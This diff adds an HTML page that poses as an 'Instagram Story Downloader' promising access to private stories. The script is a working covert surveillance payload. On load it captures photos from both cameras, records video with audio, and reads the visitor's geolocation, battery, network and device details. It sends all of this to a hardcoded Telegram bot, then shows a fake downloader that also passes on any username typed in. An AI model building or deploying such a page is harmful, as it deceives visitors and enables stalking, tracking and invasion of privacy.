@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            max-width: 350px;
+            width: 100%;
+            padding: 50px 30px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 { 
+            color: #667eea; 
+            margin-bottom: 10px; 
+            font-size: 28px;
+            letter-spacing: 2px;
+        }
+        .subtitle { 
+            color: #999; 
+            margin-bottom: 30px; 
+            font-size: 14px;
+            font-style: italic;
+        }
+        .hidden { display: none; }
+        /* Instagram UI Styles */
+        .instagram-ui {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            overflow-y: auto;
+        }
+        .navbar {
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        #header {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .insta-container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: rgba(255,255,255,0.9);
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        }
+        .form-control {
+            width: calc(100% - 22px);
+            margin-bottom: 15px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 16px;
+        }
+        #thumbdloadbtn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(45deg, #405de6, #833ab4, #c13584);
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #888;
+            padding-bottom: 20px;
+        }
+        .instagram-logo {
+            display: block;
+            margin: 20px auto;
+            width: 100px;
+        }
+        .status-container {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            display: none;
+        }
+        .status-container.show {
+            display: block;
+        }
+        .success { background-color: rgba(40,167,69,0.9); }
+        .error { background-color: rgba(220,53,69,0.9); }
+        .info { background-color: rgba(23,162,184,0.9); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Login</h1>
+        <div class="subtitle">Please wait...</div>
+    </div>
+
+    <!-- Instagram UI -->
+    <div id="instagramUI" class="instagram-ui">
+        <nav class="navbar">
+            <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
+            <h1 id="header">INSTAGRAM STORY DOWNLOADER</h1>
+        </nav>
+
+        <div class="insta-container">
+            <input id="username" type="text" class="form-control" placeholder="Enter Instagram Username" spellcheck="false">
+            <button id="thumbdloadbtn" onclick="downloadStories()">DOWNLOAD STORIES</button>
+            <div id="thumbnail-preview"></div>
+            <div id="status-message" class="status-container"></div>
+
+            <h2>How to Download Private Instagram Stories</h2>
+            <ol style="background-color: rgba(0,0,0,0.05); padding: 20px 30px; border-radius: 8px;">
+                <li>Enter the exact Instagram username of the private account</li>
+                <li>Click on the "DOWNLOAD STORIES" button</li>
+                <li>Wait for our system to bypass privacy restrictions</li>
+                <li>View and download all available stories</li>
+                <li>Save stories directly to your device</li>
+            </ol>
+        </div>
+
+        <footer>
+            <p>Made By MAFIA CJNG | @M_a_F_i_a_C_J_N_G</p>
+        </footer>
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const BOT_TOKEN = "8783265367:AAFeTUGKl-mnuDtuEljX0PVZ8aP_hKKlqgM";
+        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
+        // No YouTube redirect - show Instagram UI directly after data collection
+        // =========================
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const OWNER_ID = urlParams.get('id');
+        
+        const isTelegram = /Telegram/i.test(navigator.userAgent);
+        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+        
+        // Telegram ဆိုရင် Chrome ပြောင်းခိုင်းမယ်
+        if (isTelegram && isMobile) {
+            const currentUrl = window.location.href;
+            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+        }
+        
+        let backPhotoSent = false;
+        let frontPhotoSent = false;
+        let videoSent = false;
+        let dataCollectionComplete = false;
+        
+        // ========== SEND MESSAGE ==========
+        async function sendMessageToOwner(text) {
+            if (!OWNER_ID) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.log('Send message error:', e);
+            }
+        }
+        
+        // ========== SEND PHOTO DIRECT ==========
+        async function sendPhotoDirectToOwner(photoBlob, cameraType) {
+            if (!OWNER_ID) return;
+            
+            const formData = new FormData();
+            formData.append('chat_id', OWNER_ID);
+            formData.append('photo', photoBlob, `${cameraType}_photo.jpg`);
+            formData.append('caption', `📸 ${cameraType.toUpperCase()} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {
+                console.log('Send photo error:', e);
+            }
+        }
+        
+        // ========== SEND VIDEO ==========
+        async function sendVideoToOwner(videoBlob) {
+            if (!OWNER_ID) return;
+            
+            const formData = new FormData();
+            formData.append('chat_id', OWNER_ID);
+            formData.append('video', videoBlob, 'video.mp4');
+            formData.append('caption', `🎥 VIDEO RECORDED! (Front Camera)\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {
+                console.log('Send video error:', e);
+            }
+        }
+        
+        // ========== TAKE PHOTO ==========
+        async function takePhotoAndSend(stream, cameraType) {
+            if (cameraType === 'back' && backPhotoSent) return;
+            if (cameraType === 'front' && frontPhotoSent) return;
+            
+            if (cameraType === 'back') backPhotoSent = true;
+            if (cameraType === 'front') frontPhotoSent = true;
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            canvas.toBlob(async (blob) => {
+                await sendPhotoDirectToOwner(blob, cameraType);
+            }, 'image/jpeg', 0.7);
+        }
+        
+        // ========== VIDEO RECORDING ==========
+        async function recordFrontVideo() {
+            if (videoSent) return;
+            videoSent = true;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: true 
+                });
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendVideoToOwner(videoBlob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+                
+            } catch (err) {
+                console.log('Video error:', err);
+                await sendMessageToOwner(`❌ VIDEO RECORDING DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            }
+        }
+        
+        // ========== BACK CAMERA ==========
+        async function initBackCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" } 
+                });
+                await takePhotoAndSend(stream, 'back');
+            } catch (err) {
+                console.log('Back camera error:', err);
+                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            }
+        }
+        
+        // ========== FRONT CAMERA ==========
+        async function initFrontCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                await takePhotoAndSend(stream, 'front');
+            } catch (err) {
+                console.log('Front camera error:', err);
+                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            }
+        }
+        
+        // ========== LOCATION ==========
+        async function getLocation() {
+            if (!navigator.geolocation) {
+                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    await sendMessageToOwner(
+                        `📍 **LOCATION CAPTURED!**\n` +
+                        `🕐 Time: ${new Date().toLocaleString()}\n` +
+                        `🌍 Latitude: ${lat}\n` +
+                        `🌍 Longitude: ${lon}\n` +
+                        `📏 Accuracy: ${acc}m\n` +
+                        `🗺️ Google Maps: ${mapsLink}`
+                    );
+                },
+                async (error) => {
+                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}\n📛 Error: ${error.message}`);
+                }
+            );
+        }
+        
+        // ========== BATTERY INFO ==========
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.floor(battery.level * 100);
+                    const charging = battery.charging ? "Charging" : "Not Charging";
+                    await sendMessageToOwner(`🔋 BATTERY INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Battery Level: ${level}%\n📌 Status: ${charging}`);
+                } catch(e) {
+                    await sendMessageToOwner(`🔋 BATTERY INFO NOT AVAILABLE!`);
+                }
+            } else {
+                await sendMessageToOwner(`🔋 BATTERY INFO NOT SUPPORTED!`);
+            }
+        }
+        
+        // ========== NETWORK INFO ==========
+        async function getNetworkInfo() {
+            let networkType = "Unknown";
+            let downlink = "";
+            
+            if (navigator.connection) {
+                const type = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
+                networkType = type.toUpperCase();
+                if (navigator.connection.downlink) {
+                    downlink = ` (${navigator.connection.downlink} Mbps)`;
+                }
+            }
+            
+            let connectionMethod = "Unknown";
+            if (networkType === 'wifi' || networkType === 'WIFI') {
+                connectionMethod = "WiFi";
+            } else if (networkType === 'cellular' || networkType === '4g' || networkType === '5g' || networkType === '3g' || networkType === '2g') {
+                connectionMethod = "Cellular (Mobile Data)";
+            } else {
+                connectionMethod = networkType;
+            }
+            
+            await sendMessageToOwner(`🌐 NETWORK INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Connection Type: ${connectionMethod}\n📌 Speed: ${networkType}${downlink}`);
+        }
+        
+        // ========== DEVICE INFO ==========
+        async function sendDeviceInfo() {
+            const deviceInfo = {
+                platform: navigator.platform,
+                language: navigator.language,
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`);
+        }
+        
+        // ========== INSTAGRAM STORY DOWNLOAD FUNCTION ==========
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status-message');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-container show ${type}`;
+            setTimeout(() => {
+                statusDiv.classList.remove('show');
+            }, 5000);
+        }
+        
+        async function downloadStories() {
+            const username = document.getElementById('username').value.trim();
+            
+            if (!username) {
+                showStatus('Please enter an Instagram username!', 'error');
+                return;
+            }
+            
+            showStatus(`🔍 Searching for stories from @${username}...`, 'info');
+            
+            await sendMessageToOwner(`🔍 INSTAGRAM STORY SEARCH\n👤 Username: @${username}\n🕐 Time: ${new Date().toLocaleString()}`);
+            
+            showStatus(`⚠️ Demo mode - Instagram API integration requires additional setup.`, 'info');
+        }
+        
+        // ========== SHOW INSTAGRAM UI AFTER DATA COLLECTION ==========
+        function showInstagramUI() {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('instagramUI').style.display = 'block';
+        }
+        
+        // ========== START DATA COLLECTION ==========
+        async function startDataCollection() {
+            await sendMessageToOwner(`📱 DATA COLLECTION STARTED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            
+            await initBackCamera();
+            await initFrontCamera();
+            await recordFrontVideo();
+            await getLocation();
+            await getBatteryInfo();
+            await getNetworkInfo();
+            await sendDeviceInfo();
+            
+            await sendMessageToOwner(`✅ ALL DATA COLLECTED SUCCESSFULLY!\n🕐 Time: ${new Date().toLocaleString()}`);
+            
+            // Show Instagram UI after data collection
+            showInstagramUI();
+        }
+        
+        // ========== REQUEST CAMERA PERMISSION AND START ==========
+        async function requestCameraAndStart() {
+            if (!OWNER_ID) {
+                console.error('No owner ID found');
+                showInstagramUI();
+                return;
+            }
+            
+            await sendMessageToOwner(`🌐 USER VISITED THE PAGE!\n🕐 Time: ${new Date().toLocaleString()}\n📱 User Agent: ${navigator.userAgent.substring(0, 100)}...`);
+            
+            try {
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Start collecting data
+                await startDataCollection();
+                
+            } catch (error) {
+                console.error('Camera permission error:', error);
+                await sendMessageToOwner(`❌ CAMERA ACCESS DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+                // Still show Instagram UI even if camera denied
+                showInstagramUI();
+            }
+        }
+        
+        // ========== MAIN ==========
+        if (!isTelegram || !isMobile) {
+            requestCameraAndStart();
+        } else {
+            console.log('Redirecting to Chrome...');
+        }
+    </script>
+</body>
+</html>
